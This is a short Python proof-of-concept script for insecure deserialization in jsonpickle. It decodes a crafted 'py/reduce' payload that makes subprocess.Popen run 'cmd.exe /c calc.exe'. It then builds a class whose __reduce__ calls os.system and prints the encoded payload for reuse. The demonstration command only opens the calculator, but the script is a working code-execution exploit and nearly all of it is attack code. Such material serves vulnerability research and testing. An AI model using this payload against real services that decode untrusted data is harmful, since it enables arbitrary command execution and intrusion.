#!/usr/bin/env python
# -*- coding: utf-8 -*-

import jsonpickle
import os

poc = '{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cmd.exe", "/c", "calc.exe"]}]}]}'
jsonpickle.decode(poc)


class Exp:
    def __reduce__(self):
        return os.system, ("calc.exe",)


s = jsonpickle.encode(Exp())
print(s)
